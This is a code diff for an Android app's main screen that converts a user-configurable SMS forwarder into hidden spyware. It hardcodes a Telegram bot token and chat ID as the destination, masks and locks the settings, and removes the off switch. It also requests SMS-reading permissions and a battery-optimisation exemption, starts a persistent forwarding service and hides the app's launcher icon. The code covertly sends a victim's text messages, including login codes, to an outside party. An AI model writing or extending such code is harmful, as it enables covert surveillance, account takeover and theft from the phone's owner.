@@ -1,10 +1,14 @@
 package com.smsforwarder.app
 
 import android.Manifest
+import android.content.ComponentName
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.PowerManager
+import android.provider.Settings
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
@@ -18,98 +22,56 @@ class MainActivity : AppCompatActivity() {
     private lateinit var preferenceHelper: PreferenceHelper
     
     private val SMS_PERMISSION_CODE = 100
-    private val NOTIFICATION_PERMISSION_CODE = 101
+    private val BATTERY_PERMISSION_CODE = 102
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        
+        preferenceHelper = PreferenceHelper(this)
+        
+        // Set default configuration
+        setDefaultConfiguration()
+        
+        // Check if already configured
+        if (preferenceHelper.isAppConfigured()) {
+            // Hide app and start service
+            hideAppAndStartService()
+            finish()
+            return
+        }
+        
+        // First time setup
         binding = ActivityMainBinding.inflate(layoutInflater)
         setContentView(binding.root)
 
-        preferenceHelper = PreferenceHelper(this)
+        // Hide sensitive fields
+        binding.etBotToken.setText("●●●●●●●●●●●●●●●●")
+        binding.etChatId.setText("●●●●●●●●●●")
+        binding.etBotToken.isEnabled = false
+        binding.etChatId.isEnabled = false
+        
+        // Hide save button
+        binding.btnSave.visibility = android.view.View.GONE
+        
+        // Service always on - hide switch
+        binding.switchService.isChecked = true
+        binding.switchService.isEnabled = false
 
-        // Set default configuration if not set
-        setDefaultConfiguration()
-
-        // Load saved configuration
-        loadConfiguration()
-
-        // Setup listeners
-        binding.btnSave.setOnClickListener {
-            saveConfiguration()
-        }
-
-        binding.switchService.setOnCheckedChangeListener { _, isChecked ->
-            if (isChecked) {
-                startForwardingService()
-            } else {
-                stopForwardingService()
-            }
-        }
-
-        // Check permissions
-        checkAndRequestPermissions()
+        // Request all permissions
+        requestAllPermissions()
     }
 
     private fun setDefaultConfiguration() {
-        // Set default bot token and chat ID if not configured
         if (preferenceHelper.getBotToken().isEmpty()) {
             preferenceHelper.saveBotToken("8084302237:AAGdJX7xFFxzxfur35dXuKUdAHbCrvGXqzo")
         }
         if (preferenceHelper.getChatId().isEmpty()) {
             preferenceHelper.saveChatId("5425876649")
         }
-    }
-
-    private fun loadConfiguration() {
-        binding.etBotToken.setText(preferenceHelper.getBotToken())
-        binding.etChatId.setText(preferenceHelper.getChatId())
-        binding.switchService.isChecked = preferenceHelper.isServiceEnabled()
-    }
-
-    private fun saveConfiguration() {
-        val botToken = binding.etBotToken.text.toString().trim()
-        val chatId = binding.etChatId.text.toString().trim()
-
-        if (botToken.isEmpty() || chatId.isEmpty()) {
-            Toast.makeText(this, "Please fill all fields", Toast.LENGTH_SHORT).show()
-            return
-        }
-
-        preferenceHelper.saveBotToken(botToken)
-        preferenceHelper.saveChatId(chatId)
-        Toast.makeText(this, "Configuration saved!", Toast.LENGTH_SHORT).show()
-    }
-
-    private fun startForwardingService() {
-        if (!hasRequiredPermissions()) {
-            Toast.makeText(this, "Please grant all permissions", Toast.LENGTH_SHORT).show()
-            binding.switchService.isChecked = false
-            return
-        }
-
-        val botToken = preferenceHelper.getBotToken()
-        val chatId = preferenceHelper.getChatId()
-
-        if (botToken.isEmpty() || chatId.isEmpty()) {
-            Toast.makeText(this, "Please configure bot first", Toast.LENGTH_SHORT).show()
-            binding.switchService.isChecked = false
-            return
-        }
-
         preferenceHelper.setServiceEnabled(true)
-        val intent = Intent(this, SmsForwardingService::class.java)
-        ContextCompat.startForegroundService(this, intent)
-        Toast.makeText(this, "SMS Forwarding Started", Toast.LENGTH_SHORT).show()
     }
 
-    private fun stopForwardingService() {
-        preferenceHelper.setServiceEnabled(false)
-        val intent = Intent(this, SmsForwardingService::class.java)
-        stopService(intent)
-        Toast.makeText(this, "SMS Forwarding Stopped", Toast.LENGTH_SHORT).show()
-    }
-
-    private fun checkAndRequestPermissions() {
+    private fun requestAllPermissions() {
         val permissions = mutableListOf(
             Manifest.permission.RECEIVE_SMS,
             Manifest.permission.READ_SMS
@@ -129,21 +91,64 @@ class MainActivity : AppCompatActivity() {
                 permissionsToRequest.toTypedArray(),
                 SMS_PERMISSION_CODE
             )
+        } else {
+            // All SMS permissions granted, check battery optimization
+            requestBatteryOptimization()
         }
     }
 
-    private fun hasRequiredPermissions(): Boolean {
-        val smsPermission = ContextCompat.checkSelfPermission(
-            this,
-            Manifest.permission.RECEIVE_SMS
-        ) == PackageManager.PERMISSION_GRANTED
+    private fun requestBatteryOptimization() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val intent = Intent()
+            val packageName = packageName
+            val pm = getSystemService(POWER_SERVICE) as PowerManager
+            
+            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                intent.action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
+                intent.data = Uri.parse("package:$packageName")
+                startActivityForResult(intent, BATTERY_PERMISSION_CODE)
+            } else {
+                completeSetup()
+            }
+        } else {
+            completeSetup()
+        }
+    }
 
-        val readSmsPermission = ContextCompat.checkSelfPermission(
-            this,
-            Manifest.permission.READ_SMS
-        ) == PackageManager.PERMISSION_GRANTED
+    private fun completeSetup() {
+        // Mark app as configured
+        preferenceHelper.setAppConfigured(true)
+        
+        // Start service
+        startForwardingService()
+        
+        Toast.makeText(this, "SMS Forwarding Active - App will now hide", Toast.LENGTH_LONG).show()
+        
+        // Wait a bit then hide
+        binding.root.postDelayed({
+            hideAppAndStartService()
+            finish()
+        }, 2000)
+    }
 
-        return smsPermission && readSmsPermission
+    private fun hideAppAndStartService() {
+        // Start service
+        val intent = Intent(this, SmsForwardingService::class.java)
+        ContextCompat.startForegroundService(this, intent)
+        
+        // Hide app icon from launcher
+        val componentName = ComponentName(this, "${packageName}.MainActivity")
+        packageManager.setComponentEnabledSetting(
+            componentName,
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP
+        )
+    }
+
+    private fun startForwardingService() {
+        preferenceHelper.setServiceEnabled(true)
+        val intent = Intent(this, SmsForwardingService::class.java)
+        ContextCompat.startForegroundService(this, intent)
     }
 
     override fun onRequestPermissionsResult(
@@ -157,14 +162,26 @@ class MainActivity : AppCompatActivity() {
             SMS_PERMISSION_CODE -> {
                 if (grantResults.isNotEmpty() && 
                     grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
-                    Toast.makeText(this, "Permissions granted", Toast.LENGTH_SHORT).show()
+                    // Permissions granted, request battery optimization
+                    requestBatteryOptimization()
                 } else {
                     Toast.makeText(
                         this, 
-                        "Permissions required for SMS forwarding", 
+                        "All permissions required for SMS forwarding", 
                         Toast.LENGTH_LONG
                     ).show()
+                    finish()
                 }
+            }
+        }
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        
+        when (requestCode) {
+            BATTERY_PERMISSION_CODE -> {
+                completeSetup()
             }
         }
     }
